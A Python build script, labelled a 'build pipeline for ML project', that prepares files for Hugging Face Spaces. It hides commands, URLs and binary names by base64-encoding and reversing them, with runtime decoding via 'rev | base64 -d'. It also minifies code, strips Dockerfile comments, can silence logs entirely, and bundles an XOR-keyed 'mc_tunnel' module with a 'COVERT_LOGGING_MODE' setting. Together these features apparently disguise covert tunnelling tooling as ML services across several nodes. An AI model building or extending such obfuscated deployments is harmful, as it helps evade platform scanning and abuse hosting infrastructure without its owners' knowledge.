import argparse
import base64
import json
import os
import re
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path

import python_minifier
import yaml
from loguru import logger


def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()[::-1]


def _minify_py(content):
    return python_minifier.minify(content, remove_literal_statements=True)


def _harden_content(content):
    def replacer(match):
        raw_cmd = match.group(1)
        encoded = encode_cmd(raw_cmd)
        return f'"{encoded}"'

    return re.sub(r'HARDEN\(\s*"([^"]+)"\s*\)', replacer, content)


def build_logging(logging_mode=1):
    src_file = Path("src/core/service_logs.py")
    content = src_file.read_text()

    content = content.replace(
        "COVERT_LOGGING_MODE = 1", f"COVERT_LOGGING_MODE = {logging_mode}"
    )
    content = _minify_py(content)

    Path("dist/core").mkdir(parents=True, exist_ok=True)
    legacy_logging = Path("dist/core/logging.py")
    if legacy_logging.exists():
        legacy_logging.unlink()
    Path("dist/core/service_logs.py").write_text(content)


def build_orchestrator(logging_mode=1):
    src_file = Path("src/core/orchestrator.py")
    content = src_file.read_text()

    content = _harden_content(content)
    content = _minify_py(content)
    if "sys.path.insert" not in content:
        bootstrap = (
            "from pathlib import Path\n"
            "_P=Path(__file__).resolve().parent.parent\n"
            "sys.path.insert(0,str(_P)) if str(_P) not in sys.path else None\n"
        )
        first_nl = content.find("\n")
        if first_nl != -1 and content.startswith("import "):
            content = content[: first_nl + 1] + bootstrap + content[first_nl + 1 :]
        else:
            content = bootstrap + content

    Path("dist/core").mkdir(parents=True, exist_ok=True)
    Path("dist/core/orchestrator.py").write_text(content)
    mode_str = (
        "File Only"
        if logging_mode == 1
        else ("Console + File" if logging_mode == 2 else "DISABLED")
    )
    logger.success(f"Built core/ from src/core/ (Logging: {mode_str})")


def build_dockerfile(logging_mode=1):
    content = Path("Dockerfile").read_text()

    def url_replacer(match):
        raw_url = match.group(1)
        encoded = base64.b64encode(raw_url.encode()).decode()
        reversed_encoded = encoded[::-1]
        return f"$(printf '%s' '{reversed_encoded}' | rev | base64 -d)"

    # Replace URL_HARDEN("...") with $(printf '%s' '...' | rev | base64 -d)
    content = re.sub(r'URL_HARDEN\("([^"]+)"\)', url_replacer, content)

    # Replace PATH_HARDEN("...") — same encoding, used for paths/binary names
    content = re.sub(r'PATH_HARDEN\("([^"]+)"\)', url_replacer, content)

    if logging_mode == 0:
        content = content.replace(
            " 2>&1 | tee /home/user/.torch_metrics/startup.log", ""
        )

    # For the dist build, files are at the root of dist/, not in src/
    content = content.replace("COPY --chown=user:user src/", "COPY --chown=user:user ")

    # Inject copying of the whoami files right before USER user
    injection = "COPY --chown=user:user whoami.txt /home/user/whoami.txt\n\nUSER user"
    content = content.replace("USER user", injection)

    # Strip comments
    content = "\n".join(
        line for line in content.split("\n") if not line.lstrip().startswith("#")
    )

    Path("dist").mkdir(parents=True, exist_ok=True)
    Path("dist/Dockerfile").write_text(content)
    logger.success("Built Dockerfile from root Dockerfile")


def update_build_state(nodes_path, state_path):
    nodes_path_obj = Path(nodes_path)
    state_path_obj = Path(state_path)
    if not nodes_path_obj.exists():
        logger.warning(
            f"Nodes manifest '{nodes_path}' not found. Skipping build state update."
        )
        return

    try:
        with nodes_path_obj.open("r") as f:
            config = yaml.safe_load(f)
        nodes = config.get("nodes", {})

        state = {}
        if state_path_obj.exists():
            try:
                with state_path_obj.open("r") as f:
                    state = json.load(f)
            except Exception as e:
                logger.warning(f"Failed to read existing state.json: {e}")

        now_str = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

        for node_name, node_info in nodes.items():
            repo_id = node_info.get("hf-repo")
            if not repo_id:
                continue
            repo_type = node_info.get("repo-type", "space")

            # Calculate URL if it's a space
            direct_url = None
            if repo_type == "space":
                subdomain = repo_id.lower().replace("/", "-").replace("_", "-")
                direct_url = f"https://{subdomain}.hf.space"

            if node_name not in state:
                state[node_name] = {}

            state[node_name].update(
                {
                    "hf_repo": repo_id,
                    "repo_type": repo_type,
                    "url": direct_url,
                    "last_built": now_str,
                }
            )

        state_path_obj.resolve().parent.mkdir(parents=True, exist_ok=True)
        with state_path_obj.open("w") as f:
            json.dump(state, f, indent=2)
        logger.success(f"Updated build state in '{state_path}'")
    except Exception as e:
        logger.error(f"Failed to update '{state_path}' on build: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Build pipeline for ML project")
    parser.add_argument(
        "--logs",
        type=int,
        choices=[0, 1, 2],
        default=1,
        help="0=None, 1=File (default), 2=Console+File",
    )
    parser.add_argument(
        "--nodes",
        default="manifests/nodes.yaml",
        help="Path to nodes.yaml manifest (default: manifests/nodes.yaml)",
    )
    args = parser.parse_args()

    repo_root = Path(__file__).resolve().parent.parent
    os.chdir(repo_root)
    if not Path("src/core/orchestrator.py").exists() or not Path("Dockerfile").exists():
        logger.error(
            "Source files missing! Please ensure src/core/orchestrator.py and Dockerfile exist."
        )
        sys.exit(1)

    build_logging(logging_mode=args.logs)
    build_orchestrator(logging_mode=args.logs)
    Path("dist/core").mkdir(parents=True, exist_ok=True)
    if Path("src/core/__init__.py").exists():
        shutil.copy("src/core/__init__.py", "dist/core/__init__.py")
    if Path("src/core/service_registry.py").exists():
        reg_content = Path("src/core/service_registry.py").read_text()
        Path("dist/core/service_registry.py").write_text(_minify_py(reg_content))
        logger.success("Built dist/core/service_registry.py")
    build_dockerfile(logging_mode=args.logs)

    # Copy and minify other necessary files if python
    if Path("src/app.py").exists():
        app_content = Path("src/app.py").read_text()
        app_content = python_minifier.minify(
            app_content, remove_literal_statements=True
        )
        Path("dist/app.py").write_text(app_content)

    def _process_service_py(content):
        def replacer(match):
            raw_cmd = match.group(1)
            encoded = encode_cmd(raw_cmd)
            return f'"{encoded}"'

        content = re.sub(r'HARDEN\(\s*"([^"]+)"\s*\)', replacer, content)
        content = content.replace(
            "from client import mc_tunnel", "from . import mc_tunnel"
        )
        return python_minifier.minify(content, remove_literal_statements=True)

    if Path("src/services").exists():
        Path("dist/services").mkdir(parents=True, exist_ok=True)
        for entry in Path("src/services").iterdir():
            if entry.is_file() and entry.suffix == ".py":
                content = _process_service_py(entry.read_text())
                (Path("dist/services") / entry.name).write_text(content)

        if Path("client/mc_tunnel.py").exists():
            mc_content = Path("client/mc_tunnel.py").read_text()
            mc_content = mc_content.replace(
                "from client.crypto import XOR_KEY", "from .utils import XOR_KEY"
            )
            mc_content = python_minifier.minify(
                mc_content, remove_literal_statements=True
            )
            Path("dist/services/mc_tunnel.py").write_text(mc_content)

        logger.success("Processed and copied services to dist/services")

    if Path("src/README.md").exists():
        shutil.copy("src/README.md", "dist/README.md")

    if Path(".gitattributes").exists():
        shutil.copy(".gitattributes", "dist/.gitattributes")

    if Path("config").exists():
        shutil.copytree("config", "dist/config", dirs_exist_ok=True)
        conf_path = Path("dist/config/supervisord.conf")
        if conf_path.exists():
            conf_data = conf_path.read_text()
            if args.logs == 2:
                conf_data = conf_data.replace(
                    "stderr_logfile=/home/user/.torch_metrics/startup.log",
                    "stderr_logfile=/dev/stderr\nstderr_logfile_maxbytes=0",
                )
                conf_data = conf_data.replace(
                    "stdout_logfile=/home/user/.torch_metrics/startup.log",
                    "stdout_logfile=/dev/stdout\nstdout_logfile_maxbytes=0",
                )
            elif args.logs == 0:
                conf_data = conf_data.replace(
                    "stderr_logfile=/home/user/.torch_metrics/startup.log",
                    "stderr_logfile=/dev/null",
                )
                conf_data = conf_data.replace(
                    "stdout_logfile=/home/user/.torch_metrics/startup.log",
                    "stdout_logfile=/dev/null",
                )
            conf_path.write_text(conf_data)
            logger.success(f"Configured supervisord.conf for logging mode: {args.logs}")

    state_path = Path(args.nodes).resolve().parent / "state.json"
    update_build_state(args.nodes, state_path)

    logger.success(
        "Build complete. The files in dist/ are ready to be pushed to Hugging Face."
    )
